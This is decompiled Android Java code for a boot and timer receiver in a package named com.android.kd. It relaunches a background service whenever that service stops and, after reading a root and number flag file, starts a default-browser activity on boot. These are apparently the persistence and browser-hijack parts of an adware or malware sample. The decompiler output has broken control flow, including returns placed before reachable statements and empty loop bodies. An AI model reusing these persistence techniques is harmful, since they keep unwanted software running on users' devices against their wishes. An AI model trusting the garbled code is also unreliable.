package com.android.kd.receiver;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.android.kd.phone.DefbrowserActivity;
import com.android.kd.server.FxService;
import com.android.utils.AppManager;
import com.android.utils.Commems;
import com.android.utils.SharedPreferUtils;
import com.google.kd.utils.FileUtils;
import com.google.kd.utils.LogUtils;
import java.io.File;
import java.util.Iterator;
import java.util.List;

public class BootBroadcastReceiver extends BroadcastReceiver
{
  static final String ACTION = "android.intent.action.BOOT_COMPLETED";
  public static final String BAIDU_PKG = "com.baidu.browser.apps";
  public static final String QQ_PKG = "com.tencent.mtt";

  private void checkSate(Context paramContext)
  {
    String str1 = readLoaclNum();
    if (("" == str1) || (str1.length() < 5))
      LogUtils.e("wyy", Commems.PHONE_FLAGE + " error :" + str1);
    String str2;
    String str3;
    do
    {
      return;
      String[] arrayOfString = str1.split("#");
      str2 = arrayOfString[0].substring(5, arrayOfString[0].length());
      str3 = arrayOfString[1].substring(1 + arrayOfString[1].indexOf("="), arrayOfString[1].length());
    }
    while (("0".equals(str2)) || (!"1".equals(str2)));
    recoverState(str3);
    Intent localIntent = new Intent(paramContext, DefbrowserActivity.class);
    localIntent.addFlags(268435456);
    paramContext.startActivity(localIntent);
  }

  private static String readLoaclNum()
  {
    Object localObject = "";
    if (new File(Commems.PHONE_FLAGE).exists())
    {
      String str = FileUtils.readFile(Commems.PHONE_FLAGE);
      if ((!"".equals(str)) && (str != null))
        localObject = str;
    }
    return localObject;
  }

  private void recoverState(String paramString)
  {
    FileUtils.writeStringToSdcard("root=0#num=" + paramString, Commems.PHONE_FLAGE);
  }

  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (AppManager.isStop(paramContext));
    do
    {
      Log.e("wyy", "--isStopStart-!!");
      do
        return;
      while (!SharedPreferUtils.readStateToSp());
      if (paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED"))
      {
        LogUtils.e("wyy", "----com.test.root ---BOOT_COMPLETED---1017-");
        checkSate(paramContext);
        return;
      }
    }
    while (!paramIntent.getAction().equals("android.intent.action.TIME_TICK"));
    Iterator localIterator = ((ActivityManager)paramContext.getSystemService("activity")).getRunningServices(2147483647).iterator();
    while (true)
    {
      if (!localIterator.hasNext())
      {
        paramContext.startService(new Intent(paramContext, FxService.class));
        return;
      }
      if (!"com.android.kd.server.FxService".equals(((ActivityManager.RunningServiceInfo)localIterator.next()).service.getClassName()));
    }
  }
}

/* Location:           C:\Users\Tato\Desktop\android反编译\Tool\classes_dex2jar.jar
 * Qualified Name:     com.android.kd.receiver.BootBroadcastReceiver
 * JD-Core Version:    0.6.2
 */